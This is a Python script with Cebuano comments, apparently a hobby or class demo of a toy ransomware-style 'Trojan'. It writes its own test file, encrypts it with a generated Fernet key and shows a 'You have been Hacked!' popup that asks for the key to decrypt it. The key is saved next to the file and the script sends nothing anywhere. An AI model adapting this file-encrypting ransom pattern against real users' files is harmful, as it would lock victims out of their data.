from cryptography.fernet import Fernet
import os 
import tkinter as tk
from tkinter import messagebox
from tkinter import simpledialog

Message = "Bayot Lindo" # Ang mo gawas sa testfile before ma encrypt Pwede jud ni ma ilisan nimo

class Safe:
    def __init__(self):
        self.FilePath = "C:/Users/Maan/Documents/PythonProjects/InnocentFile/testfile.txt" #e change ang location ani kung lain ni nga computer
        self.KeyfilePath = "C:/Users/Maan/Documents/PythonProjects/InnocentFile/secretkey.txt" #e change ang location ani kung lain ni nga computer
        self.key = None

        if not os.path.exists(self.FilePath): # Ug wala gani ni exist mo create ug txt file hehe
            with open(self.FilePath, 'w') as file:
                file.write(Message)
        else:
            with open(self.FilePath, 'w') as file:
                file.write(Message)
        
    def GenerateKey(self):
        if not os.path.exists(self.KeyfilePath):
            print("Key file does not exist. Generating a new key.")
            self.key = Fernet.generate_key()
            with open(self.KeyfilePath, 'wb') as key_file:
                key_file.write(self.key)
                print("Key generated and saved.")
        else:
            self.key = Fernet.generate_key()
            with open(self.KeyfilePath, 'wb') as key_file:
                key_file.write(self.key)
                print("Key rewritten generated and saved.")
                print(self.key)
            
    def encrypt_file(self):
        if not os.path.exists(self.FilePath):
            print("File does not exist.")
            return
        
        self.key = self.load_key()
        fernet = Fernet(self.key)
        
        with open(self.FilePath, 'rb') as file:
            original_data = file.read()
            encrypted_data = fernet.encrypt(original_data)

        with open(self.FilePath, 'wb') as file:
            file.write(encrypted_data)
        print("File encrypted successfully.")

    def load_key(self): # Liboga baya ani oi!!
        if not os.path.exists(self.KeyfilePath): # mo check ug naa ba ang secretfile.txt
            print("Key file does not exist.")
            return None
        return open(self.KeyfilePath, 'rb').read()
    
    def decrypt_file(self):
        if not os.path.exists(self.FilePath):
            print("File does not exist.")
            return
        
        self.key = self.load_key()
        if self.key is None:
            return
        
        fernet = Fernet(self.key)
        
        with open(self.FilePath, 'rb') as file:
            encrypted_data = file.read()
            decrypted_data = fernet.decrypt(encrypted_data)
            print("Decrypted data:", decrypted_data.decode())

        with open(self.FilePath, 'wb') as file:
            file.write(decrypted_data)
            print("File decrypted successfully.")
    
    def display_Message(self):
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("Trojan", "You have been Hacked!.")
        UserInput = simpledialog.askstring("Input", "Enter the key to decrypt the file:")
        if UserInput == self.key.decode():
            self.decrypt_file()
        else:
            messagebox.showerror("Error", "Incorrect key. File remains encrypted.")
           
        


# Example usage:
# safe = Safe()

Safe = Safe()
Safe.GenerateKey()
Safe.encrypt_file()
Safe.display_Message()



        



# file_path = "c:/Users/topiary/Documents/tester path/testtxt.txt"
# if os.path.exists(file_path):

#         key = Fernet.generate_key()
#         with open('c:/Users/topiary/Documents/tester path/secretkey.txt', 'wb') as key_file:
#             key_file.write(key)

#         def load_key():
#              return open ('c:/Users/topiary/Documents/tester path/secretkey.txt', 'rb').read()


#         def encrypt_file(filename):
#             key = load_key()
#             fernet = Fernet(key)
#             with open(filename, 'rb') as file:
#                  original_Data = file.read()
#                  encrypted_Data = fernet.encrypt(original_Data)

#             with open(filename,'wb') as file:
#                  file.write(encrypted_Data)
#         encrypt_file(file_path)
                
# else:
#     print('file doesnt exist')




# def create_key():
#             key = Fernet.generate_key()
#             with open('secret.key', 'wb') as key_file:
#                 key_file.write(key)

# def load_key():
#              return open ('c:/Users/topiary/Documents/tester path/secretkey.txt', 'rb').read()
        


# def encrypt_file(filename):
#             key = load_key()
#             fernet = Fernet(key)
#             with open(filename, 'rb') as file:
#                  original_Data = file.read()
#                  encrypted_Data = fernet.encrypt(original_Data)

#             with open(filename,'wb') as file:
#                  file.write(encrypted_Data)
# encrypt_file('c:/Users/topiary/Documents/tester path/testtxt.txt')